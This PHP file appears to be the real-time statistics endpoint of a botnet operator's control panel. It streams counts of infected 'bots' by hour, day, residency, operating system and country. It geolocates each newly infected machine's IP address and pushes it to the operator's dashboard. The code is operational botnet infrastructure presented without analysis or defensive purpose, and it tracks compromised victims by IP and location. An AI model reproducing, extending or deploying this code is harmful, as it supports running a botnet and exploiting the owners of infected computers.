<?php
session_start();
set_time_limit(30); 
@ini_set('zlib.output_compression',0);
if(function_exists('apache_setenv'))
	@apache_setenv('no-gzip',1);
error_reporting(E_ALL);
define('CP', TRUE);

$start = time();

header('Content-Type: text/event-stream');
header('Cache-Control: no-cache'); 
header('X-Accel-Buffering: no');
		
if(!is_readable(__DIR__.'/config.php'))
	die();

include __DIR__.'/geoip/geoipcity.php';
include __DIR__.'/config.php';  



$database = @new mysqli($MYSQL_HOST, $MYSQL_LOGIN, $MYSQL_PASSWORD, $MYSQL_DB);
if (mysqli_connect_error())die();
@mysqli_query($database, 'SET NAMES "utf8" COLLATE "utf8_unicode_ci";');

include __DIR__.'/common.php';


if (USER_LOGGED) {
	    if(!check_user($database, $UserID))
			logout();
} else die();

session_write_close();



$gi = geoip_open("geoip/GeoLiteCity.dat", GEOIP_STANDARD);

function sendMsg($msg) {
  echo "data: ".base64_encode($msg) . PHP_EOL;
  echo PHP_EOL;
  ob_flush();
  flush();

}

function humanTiming($time){
    $time = time() - $time; // to get the time since that moment
    $time = ($time<1)? 1 : $time;
    $tokens = array(31536000 => 'year',2592000 => 'month',604800 => 'week',86400 => 'day',3600 => 'hour',60 => 'min',1 => 'sec');

    foreach ($tokens as $unit => $text) {
        if ($time < $unit) continue;
        $numberOfUnits = floor($time / $unit);
        return $numberOfUnits.' '.$text.(($numberOfUnits>1)?'s':'');
    }

}
	$bots_total = 0;
	$bots_per_day = 0;
	$bots_per_hour = 0;

	$now = time();
	
	
	$sql = "SELECT COUNT(*) FROM `bots` WHERE `timeAdd` > {$now}-(60*60*24)"; 
	$result = mysqli_query($database, $sql) or die(); 
	$row = mysqli_fetch_row($result) or die(); 
	mysqli_free_result($result);
	$bots_per_day = $row[0];
	
	$sql = "SELECT COUNT(*) FROM `bots` WHERE `timeLast` > {$now}-(60*60*24)"; 
	$result = mysqli_query($database, $sql) or die(); 
	$row = mysqli_fetch_row($result) or die(); 
	mysqli_free_result($result);
	$bots_per_day_resident = $row[0];
	
	$sql = "SELECT COUNT(*) FROM `bots` WHERE `timeLast` > {$now}-(60*60*24*7)"; 
	$result = mysqli_query($database, $sql) or die(); 
	$row = mysqli_fetch_row($result) or die(); 
	mysqli_free_result($result);
	$bots_per_week_resident = $row[0];
	
	
	
	$sql = "SELECT COUNT(*) FROM `bots`"; 
	$result = mysqli_query($database, $sql) or die(); 
	$row = mysqli_fetch_row($result) or die(); 
	mysqli_free_result($result);
	$bots_total = $row[0];
	
	$InitMsg = '0|';

	$result = mysqli_query($database, "SELECT * FROM `bots` ORDER BY `timeAdd` DESC LIMIT 5") or die(); 
	if(mysqli_num_rows($result) > 0)
	{
		while($row = mysqli_fetch_array($result))
		{
			$InitMsg .= long2ip($row['ip']).'#'.$row['cc'].'#';
			$InitMsg .= $bots_per_hour.'#'.$bots_per_day.'#'.$bots_total.'#'.$bots_per_day_resident.'#'.$bots_per_week_resident;
			$InitMsg .= '#'.humanTiming($row['timeAdd']).'#'.$row['os'].'/';
		}
	}
	mysqli_free_result($result);


	$InitMsg .= '|';
	$result = mysqli_query($database, "SELECT COUNT(*), `os` FROM `bots` GROUP BY `os` ORDER BY COUNT(*) DESC") or die(); 
	if(mysqli_num_rows($result) > 0)
	{
		while($row = mysqli_fetch_array($result))
		{
			$InitMsg .= $row[1].':'.$row[0].'#';
		}
	}
	mysqli_free_result($result);
	$InitMsg .= '|';

	$result = mysqli_query($database, "SELECT COUNT(*), `cc` FROM `bots` GROUP BY `cc` ORDER BY COUNT(*) DESC") or die(); 
	if(mysqli_num_rows($result) > 0)
	{
		while($row = mysqli_fetch_array($result))
		{
			$InitMsg .= $row[1].':'.$row[0].'#';
		}
	}
	mysqli_free_result($result);
	
	sendMsg($InitMsg);
	
	$filename = "cp.lock";
	$lastMod = filemtime($filename);
	$lastMysqlTime = time();
	$lastTOTALbotsTIME = time();
	
	
	while(true){
		if(time()-20 > $start)
			exit;
		$bots_update_status = false;
			if($lastTOTALbotsTIME > (time() * 60))
			{
				$now = time();
				$sql = "SELECT COUNT(*) FROM `bots` WHERE `timeAdd` > {$now}-(60*60)"; 
				$result = @mysqli_query($database, $sql); 
				$row = @mysqli_fetch_row($result); 
				mysqli_free_result($result);
				$bots_per_hour = $row[0];
	
				$sql = "SELECT COUNT(*) FROM `bots` WHERE `timeAdd` > {$now}-(60*60*24)"; 
				$result = @mysqli_query($database, $sql); 
				$row = @mysqli_fetch_row($result); 
				@mysqli_free_result($result);
				$bots_per_day = $row[0];
	
				$sql = "SELECT COUNT(*) FROM `bots`"; 
				$result = @mysqli_query($database, $sql); 
				$row = @mysqli_fetch_row($result); 
				@mysqli_free_result($result);
				$bots_total = $row[0];
				$bots_update_status = true;
			}
			
			$lastTOTALbotsTIME = time();
		
		
		if($lastMod != filemtime($filename)){
			$lastMod = filemtime($filename);
			$result = mysqli_query($database, "SELECT * FROM `bots` WHERE `timeAdd` > {$lastMysqlTime}"); 
			$lastMysqlTime = time();
			
			
			
			if(mysqli_num_rows($result) > 0)
			{
				while($row = mysqli_fetch_array($result)){
				if($bots_update_status == true)
					$bots_update_status= false;
				else{
					$bots_total++;
					$bots_per_day++;
					$bots_per_hour++;
				}
					$ToSend = '1|'.long2ip($row['ip']).'|';
					
					$record = geoip_record_by_addr($gi, long2ip($row['ip']));
					if(is_numeric($record->latitude) && is_numeric($record->longitude))
						$ToSend .= $record->latitude.'|'.$record->longitude.'|';
					else
						$ToSend .= '0|0|';
				
					$ToSend .= $record->country_code.'|';
					$ToSend .= $bots_per_hour.'|'.$bots_per_day.'|'.$bots_total.'|'.$bots_per_day_resident.'|'.$bots_per_week_resident.'|';
					$ToSend .= humanTiming($row['timeAdd']).'|';
					$ToSend .= $row['os'];
					sendMsg($ToSend);
				}
			}
			@mysqli_free_result($result);
		
		}
		
		Sleep(1);
		clearstatcache();
	}
	


		
	
mysqli_close($database);
geoip_close($gi);
?>
